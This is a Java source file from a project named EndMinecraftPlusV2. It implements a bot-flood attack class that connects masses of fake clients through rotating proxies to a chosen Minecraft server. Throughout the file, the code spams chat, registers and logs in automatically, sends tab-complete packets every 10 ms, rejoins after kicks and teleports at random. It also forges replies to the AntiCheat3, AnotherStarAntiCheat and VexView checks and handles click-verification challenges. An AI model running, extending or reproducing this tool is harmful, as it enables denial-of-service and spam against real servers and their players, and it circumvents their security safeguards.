package cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils;

import cn.serendipityr.EndMinecraftPlusV2.Tools.*;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.*;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AnotherStarAntiCheat;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AntiCheat3;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.player.ClientPlayerMovementPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundCustomPayloadPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundLoginPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.player.ClientboundPlayerPositionPacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerStatusOnlyPacket;
import com.github.steveice10.packetlib.ProxyInfo;
import com.github.steveice10.packetlib.Session;
import com.github.steveice10.packetlib.event.session.*;
import com.github.steveice10.packetlib.packet.Packet;
import io.netty.util.internal.ConcurrentSet;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.serializer.gson.GsonComponentSerializer;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NewBotAttack extends IAttack {
    public static HashMap<Session, String> clientName = new HashMap<>();
    public static int failed = 0;
    public static int joined = 0;
    public static int rejoin = 0;
    public static int clickVerifies = 0;
    public static List<String> alivePlayers = new ArrayList<>();
    public static HashMap<Session,ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
    public static HashMap<Session,ClientboundPlayerPositionPacket> newPositionPacket = new HashMap<>();
    protected boolean attack_motdbefore;
    protected boolean attack_tab;
    protected Map<String, String> modList;

    private Thread mainThread;
    private Thread tabThread;
    private Thread taskThread;

    public Set<Session> clients = new ConcurrentSet<>();
    public ExecutorService pool = Executors.newCachedThreadPool();

    private static final AntiCheat3 ac3 = new AntiCheat3();
    private static final AnotherStarAntiCheat asac = new AnotherStarAntiCheat();

    private long starttime;

    public NewBotAttack(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void setBotConfig(boolean motdbefore, boolean tab, Map<String, String> modList) {
        this.attack_motdbefore = motdbefore;
        this.attack_tab = tab;
        this.modList = modList;
    }

    public String getRandMessage(String userName) {
        return ConfigUtil.CustomChat.get(new Random().nextInt(ConfigUtil.CustomChat.size())).replace("$rnd",OtherUtils.getRandomString(4,6).replace("$pwd",DataUtil.botRegPasswordsMap.get(userName)));
    }

    public void start() {
        setTask(() -> {
            while (true) {
                for (Session c : clients) {
                    if (c.isConnected()) {
                        if (c.hasFlag("login")) {
                            if (ConfigUtil.ChatSpam) {
                                if (ProtocolLibs.adaptAfter760) {
                                    VersionSupport760.sendChatPacket(c, getRandMessage(clientName.get(c)));
                                } else if (ProtocolLibs.adaptAfter759) {
                                    VersionSupport759.sendChatPacket(c, getRandMessage(clientName.get(c)));
                                } else if (ProtocolLibs.adaptAfter758) {
                                    VersionSupport758.sendChatPacket(c, getRandMessage(clientName.get(c)));
                                } else {
                                    c.send(new ClientChatPacket(getRandMessage(clientName.get(c))));
                                }

                                OtherUtils.doSleep(ConfigUtil.ChatDelay);
                            }

                            if (ConfigUtil.RandomTeleport) {
                                if (ProtocolLibs.adaptAfter758) {
                                    ClientboundPlayerPositionPacket positionRotationPacket = newPositionPacket.get(c);

                                    if (c.isConnected() && positionRotationPacket != null) {
                                        new Thread(() -> {
                                            try {
                                                VersionSupport758.sendPosPacket(c, positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                                Thread.sleep(500);
                                                VersionSupport758.sendPosPacket(c, positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                            } catch (InterruptedException e) {
                                                throw new RuntimeException(e);
                                            }
                                        }).start();
                                    }
                                } else {
                                    ServerPlayerPositionRotationPacket positionRotationPacket = positionPacket.get(c);

                                    if (c.isConnected() && positionRotationPacket != null) {
                                        new Thread(() -> {
                                            try {
                                                cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MultiVersionPacket.sendPosPacket(c, positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                                Thread.sleep(500);
                                                cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MultiVersionPacket.sendPosPacket(c, positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                            } catch (InterruptedException e) {
                                                throw new RuntimeException(e);
                                            }
                                        }).start();
                                    }
                                }
                            }
                        } else if (c.hasFlag("join")) {
                            if (ConfigUtil.RegisterAndLogin) {
                                for (String cmd:ConfigUtil.RegisterCommands) {
                                    if (ProtocolLibs.adaptAfter760) {
                                        VersionSupport760.sendChatPacket(c, cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c))));
                                    } else if (ProtocolLibs.adaptAfter759) {
                                        VersionSupport759.sendChatPacket(c, cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c))));
                                    } else if (ProtocolLibs.adaptAfter758) {
                                        VersionSupport758.sendChatPacket(c, cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c))));
                                    } else {
                                        c.send(new ClientChatPacket(cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c)))));
                                    }

                                    OtherUtils.doSleep(ConfigUtil.ChatDelay);
                                }
                            }

                            c.setFlag("login", true);
                        }
                    }
                }

                OtherUtils.doSleep(1000);
            }
        });

        this.starttime = System.currentTimeMillis();

        mainThread = new Thread(() -> {
            while (true) {
                try {
                    createClients(ip, port);

                    if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
                        for (Session c : clients) {
                            c.disconnect("");
                        }
                        stop();
                        return;
                    }

                    OtherUtils.doSleep(5 * 1000);
                    LogUtil.doLog(0, "当前连接数: " + clients.size() + "个", "BotAttack");
                    cleanClients();
                } catch (Exception e) {
                    LogUtil.doLog(1, "发生错误: " + e, null);
                }
            }
        });

        if (this.attack_tab) {
            tabThread = new Thread(() -> {
                while (true) {
                    for (Session c : clients) {
                        if (c.isConnected() && c.hasFlag("join")) {
                            if (ProtocolLibs.adaptAfter758) {
                                VersionSupport758.sendTabPacket(c, "/");
                            } else {
                                MultiVersionPacket.sendTabPacket(c, "/");
                            }
                        }
                    }

                    OtherUtils.doSleep(10);
                }
            });
        }

        mainThread.start();
        if (tabThread != null)
            tabThread.start();
        if (taskThread != null)
            taskThread.start();
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        mainThread.stop();
        if (tabThread != null)
            tabThread.stop();
        if (taskThread != null)
            taskThread.stop();
    }

    public void setTask(Runnable task) {
        taskThread = new Thread(task);
    }

    private void cleanClients() {
        for (Session client:clients) {
            String username = clientName.get(client);

            if (!client.isConnected()) {
                alivePlayers.remove(username);
                clientName.remove(client);
                clients.remove(client);
            } else if (!alivePlayers.contains(username) && (client.hasFlag("login") || client.hasFlag("join"))) {
                alivePlayers.add(username);
            }
        }
    }

    private void createClients(final String ip, int port) {
        Proxy.Type proxyType;
        switch (ConfigUtil.ProxyType) {
            case 3:
            case 2:
                proxyType = Proxy.Type.SOCKS;
                break;
            case 1:
            default:
                proxyType = Proxy.Type.HTTP;
                break;
        }

        for (String p: ProxyUtil.proxies) {
            try {
                SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);

                String[] _p = p.split(":");
                Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                String[] User = AttackManager.getRandomUser().split("@");
                Session client = createClient(ip, port, User[0], proxy);
                client.setReadTimeout(5 * 1000);
                client.setWriteTimeout(5 * 1000);
                clientName.put(client, User[0]);
                clients.add(client);
                ProxyUtil.clientsProxy.put(client, proxy);

                if (this.attack_motdbefore) {
                    pool.submit(() -> {
                        getMotd(proxy, ip, port);
                        client.connect(false);
                    });
                } else {
                    client.connect(false);
                }

                if (this.attack_maxconnect > 0 && (clients.size() > this.attack_maxconnect)) {
                    return;
                }

                if (this.attack_joinsleep > 0) {
                    OtherUtils.doSleep(attack_joinsleep);
                }
            } catch (Exception e) {
                LogUtil.doLog(1, "发生错误: " + e, null);
            }
        }
    }

    public Session createClient(final String ip, int port, final String username, Proxy proxy) {
        Session client;

        String proxyStr = String.valueOf(proxy.address()).replace("/", "");
        String[] proxyAddress = proxyStr.split(":");
        ProxyInfo.Type proxyType;

        switch (ConfigUtil.ProxyType) {
            case 2:
                proxyType = ProxyInfo.Type.SOCKS4;
                break;
            case 3:
                proxyType = ProxyInfo.Type.SOCKS5;
                break;
            case 1:
            default:
                proxyType = ProxyInfo.Type.HTTP;
                break;
        }

        ProxyInfo proxyInfo = new ProxyInfo(proxyType, new InetSocketAddress(proxyAddress[0], Integer.parseInt(proxyAddress[1])));
        client = VersionSupport754.getSession(ip, port, username, proxyInfo);

        new MCForge(client, this.modList).init();

        client.addListener(new SessionListener() {
            public void packetReceived(PacketReceivedEvent e) {
                new Thread(() -> {
                    if (ProtocolLibs.adaptAfter758) {
                        newHandlePacket(e.getSession(), e.getPacket(), username);
                    } else {
                        handlePacket(e.getSession(), e.getPacket(), username);
                    }
                }).start();

                if (ConfigUtil.SaveWorkingProxy) {
                    ProxyUtil.saveWorkingProxy(proxy);
                }
            }

            public void packetReceived(Session session, Packet packet) {
                new Thread(() -> {
                    if (ProtocolLibs.adaptAfter758) {
                        newHandlePacket(session, packet, username);
                    } else {
                        handlePacket(session, packet, username);
                    }
                }).start();

                if (ConfigUtil.SaveWorkingProxy) {
                    ProxyUtil.saveWorkingProxy(proxy);
                }
            }

            public void packetSending(PacketSendingEvent packetSendingEvent) {

            }

            public void packetSent(Session session, Packet packet) {

            }

            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            public void packetError(PacketErrorEvent packetErrorEvent) {

            }

            public void connected(ConnectedEvent e) {
            }

            public void disconnecting(DisconnectingEvent e) {
            }

            public void disconnected(DisconnectedEvent e) {
                String msg;

                if (e.getCause() == null) {
                    msg = e.getReason();

                    if (ProtocolLibs.adaptAfter754) {
                        Component component = GsonComponentSerializer.gson().deserialize(msg);
                        msg = PlainTextComponentSerializer.plainText().serialize(component);
                    }

                    LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + msg, "BotAttack");

                    if (ConfigUtil.SaveWorkingProxy) {
                        ProxyUtil.saveWorkingProxy(proxy);
                    }

                    for (String rejoinDetect:ConfigUtil.RejoinDetect) {
                        if (msg.contains(rejoinDetect)) {
                            new Thread(() -> {
                                for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
                                    OtherUtils.doSleep(ConfigUtil.RejoinDelay);

                                    Session rejoinClient = createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
                                    rejoinClient.setReadTimeout(5000);
                                    rejoinClient.setWriteTimeout(5000);

                                    rejoin++;
                                    LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
                                    clientName.put(rejoinClient, username);
                                    clients.add(rejoinClient);
                                    rejoinClient.connect(false);

                                    if (rejoinClient.hasFlag("join") || rejoinClient.hasFlag("login")) {
                                        break;
                                    }
                                }
                            }).start();
                        }
                    }
                } else if (ConfigUtil.ShowFails) {
                    //msg = e.getCause().getMessage();
                    LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + e.getCause(), "BotAttack");
                }

                failed++;
                alivePlayers.remove(username);

                client.disconnect("");
                clients.remove(client);
            }
        });
        return client;
    }

    public void getMotd(Proxy proxy, String ip, int port) {
        try {
            Socket socket = new Socket(proxy);
            socket.connect(new InetSocketAddress(ip, port));
            if (socket.isConnected()) {
                OutputStream out = socket.getOutputStream();
                InputStream in = socket.getInputStream();
                out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                out.write(new byte[]{0x01, 0x00});
                out.flush();
                in.read();

                try {
                    in.close();
                    out.close();
                    socket.close();
                } catch (Exception ignored) {}

                return;
            }
            socket.close();
        } catch (Exception ignored) {}
    }

    protected void handlePacket(Session session, Packet recvPacket, String username) {
        if (recvPacket instanceof ServerPluginMessagePacket) {
            ServerPluginMessagePacket packet = (ServerPluginMessagePacket) recvPacket;
            switch (packet.getChannel()) {
                case "AntiCheat3.4.3":
                    String code = ac3.uncompress(packet.getData());
                    byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
                            new String[]{"44f6bc86a41fa0555784c255e3174260"});
                    session.send(new ClientPluginMessagePacket("AntiCheat3.4.3", checkData));
                    break;
                case "anotherstaranticheat":
                    String salt = asac.decodeSPacket(packet.getData());
                    byte[] data = asac.encodeCPacket(new String[]{"4863f8708f0c24517bb5d108d45f3e15"}, salt);
                    session.send(new ClientPluginMessagePacket("anotherstaranticheat", data));
                    break;
                case "VexView":
                    if (new String(packet.getData()).equals("GET:Verification"))
                        session.send(new ClientPluginMessagePacket("VexView", "Verification:1.8.10".getBytes()));
                    break;
                default:
            }
        } else if (recvPacket instanceof ServerJoinGamePacket) {
            session.setFlag("join", true);
            LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");
            joined++;

            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }

            MultiVersionPacket.sendClientSettingPacket(session, "zh_CN");
            MultiVersionPacket.sendClientPlayerChangeHeldItemPacket(session, 1);
        } else if (recvPacket instanceof ServerPlayerPositionRotationPacket) {
            try {
                ServerPlayerPositionRotationPacket packet = (ServerPlayerPositionRotationPacket) recvPacket;
                MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
                session.send(new ClientPlayerMovementPacket(true));
                MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);
                positionPacket.put(session, packet);
            } catch (Exception ignored) {}

        } else if (recvPacket instanceof ServerChatPacket) {
            ServerChatPacket chatPacket = (ServerChatPacket) recvPacket;

            if (ProtocolLibs.adaptAfter754) {
                List<String> result = VersionSupport754.clickVerifiesHandle(chatPacket, session, ConfigUtil.ClickVerifiesDetect, null);

                if (result.get(0).equals("1")) {
                    LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get(2), "BotAttack");
                    clickVerifies++;
                } else if (!result.get(1).equals("")) {
                    LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get(1), "BotAttack");
                }

                if (!alivePlayers.contains(username)) {
                    alivePlayers.add(username);
                }
            }
        } else if (recvPacket instanceof ServerKeepAlivePacket) {
            ClientKeepAlivePacket keepAlivePacket = new ClientKeepAlivePacket(((ServerKeepAlivePacket) recvPacket).getPingId());
            session.send(keepAlivePacket);
        }
    }

    protected void newHandlePacket(Session session, Packet recvPacket, String username) {
        if (recvPacket instanceof ClientboundCustomPayloadPacket) {
            ClientboundCustomPayloadPacket packet = (ClientboundCustomPayloadPacket) recvPacket;
            switch (packet.getChannel()) {
                case "AntiCheat3.4.3":
                    String code = ac3.uncompress(packet.getData());
                    byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
                            new String[]{"44f6bc86a41fa0555784c255e3174260"});
                    session.send(new ServerboundCustomPayloadPacket("AntiCheat3.4.3", checkData));
                    break;
                case "anotherstaranticheat":
                    String salt = asac.decodeSPacket(packet.getData());
                    byte[] data = asac.encodeCPacket(new String[]{"4863f8708f0c24517bb5d108d45f3e15"}, salt);
                    session.send(new ServerboundCustomPayloadPacket("anotherstaranticheat", data));
                    break;
                case "VexView":
                    if (new String(packet.getData()).equals("GET:Verification"))
                        session.send(new ServerboundCustomPayloadPacket("VexView", "Verification:1.8.10".getBytes()));
                    break;
                default:
            }
        } else if (recvPacket instanceof ClientboundLoginPacket) {
            session.setFlag("join", true);
            LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");
            joined++;

            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }

            VersionSupport758.sendClientSettingPacket(session, "zh_CN");
            VersionSupport758.sendClientPlayerChangeHeldItemPacket(session, 1);
        } else if (recvPacket instanceof ClientboundKeepAlivePacket) {
            ServerboundKeepAlivePacket keepAlivePacket = new ServerboundKeepAlivePacket(((ClientboundKeepAlivePacket) recvPacket).getPingId());
            session.send(keepAlivePacket);
            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }
        } else if (recvPacket instanceof ClientboundPlayerPositionPacket) {
            try {
                ClientboundPlayerPositionPacket packet = (ClientboundPlayerPositionPacket) recvPacket;
                VersionSupport758.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
                session.send(new ServerboundMovePlayerStatusOnlyPacket(true));
                VersionSupport758.sendClientTeleportConfirmPacket(session, packet);
                newPositionPacket.put(session,packet);
            } catch (Exception ignored) {}
        } else if (ProtocolLibs.adaptAfter760 && VersionSupport760.checkServerChatPacket(recvPacket)) {
            List<String> result = VersionSupport760.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);

            if (result.get(0).equals("1")) {
                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get(2), "BotAttack");
                clickVerifies++;
            } else if (!result.get(1).equals("")) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get(1), "BotAttack");
            }

            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }
        } else if (VersionSupport759.checkServerChatPacket(recvPacket)) {
            List<String> result = VersionSupport759.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);

            if (result.get(0).equals("1")) {
                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get(2), "BotAttack");
                clickVerifies++;
            } else if (!result.get(1).equals("")) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get(1), "BotAttack");
            }

            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }
        } else if (VersionSupport758.checkServerChatPacket(recvPacket)) {
            List<String> result = VersionSupport758.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);

            if (result.get(0).equals("1")) {
                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get(2), "BotAttack");
                clickVerifies++;
            } else if (!result.get(1).equals("")) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get(1), "BotAttack");
            }

            if (!alivePlayers.contains(username)) {
                alivePlayers.add(username);
            }
        }
    }
}
